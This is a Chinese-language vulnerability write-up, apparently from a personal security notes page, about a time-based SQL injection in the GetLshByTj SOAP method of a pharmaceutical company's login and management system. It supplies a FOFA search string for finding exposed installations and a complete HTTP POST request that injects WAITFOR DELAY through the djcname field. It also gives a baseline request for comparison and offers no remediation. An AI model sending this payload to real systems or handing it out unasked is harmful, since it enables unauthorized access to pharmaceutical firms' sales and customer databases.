# 医药公司登录系统GetLshByTj存在SQL注入漏洞

# 一、漏洞简介
医药公司登录系统是一个全面且高效的管理工具，涵盖了销售管理、客户档案管理、药品字典管理等多个核心模块。该系统支持前台零售、批发销售、销售审核等多种销售方式，并具备完善的客户档案管理功能，包括客户的基本信息、经营权限等。此外，系统还提供国药标准药品字典库云下载功能，便于用户快速获取药品信息。整体而言，医药公司登录系统通过自动化的管理和数据分析，帮助医药企业优化业务流程，提升市场竞争力。

# 二、影响版本
+ 医药公司登录系统

# 三、资产测绘
+ fofa`body="ResourceScripts/zh-cn-Login.aspx.js"`

![1718300393150-bc4c042c-e623-4c35-bd2f-b019efc0686a.png](./img/YJr-f544KP8rikO0/1718300393150-bc4c042c-e623-4c35-bd2f-b019efc0686a-267631.png)

# 四、漏洞复现
```java
POST /WebService.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/GetLshByTj
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 454

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetLshByTj>
         <!--type: string-->
         <tem:tjstr>gero et</tem:tjstr>
         <!--type: string-->
         <tem:djcname>onoras imperio';WAITFOR DELAY '0:0:5'--</tem:djcname>
         <!--type: boolean-->
         <tem:redonly>true</tem:redonly>
      </tem:GetLshByTj>
   </soapenv:Body>
</soapenv:Envelope>
```

![1718692030456-63586960-4583-46f0-826d-701762b755e0.png](./img/YJr-f544KP8rikO0/1718692030456-63586960-4583-46f0-826d-701762b755e0-777595.png)

```java
POST /WebService.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/GetLshByTj
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 478

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetLshByTj>
         <!--type: string-->
         <tem:tjstr>gero et</tem:tjstr>
         <!--type: string-->
         <tem:djcname>onoras imperio</tem:djcname>
         <!--type: boolean-->
         <tem:redonly>true</tem:redonly>
      </tem:GetLshByTj>
   </soapenv:Body>
</soapenv:Envelope>
```

![1718692048095-bbd1d173-eb00-4cd1-9589-c26ed768f0fd.png](./img/YJr-f544KP8rikO0/1718692048095-bbd1d173-eb00-4cd1-9589-c26ed768f0fd-644411.png)



> 更新: 2024-06-23 23:40:49  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ffth09eureon16c6>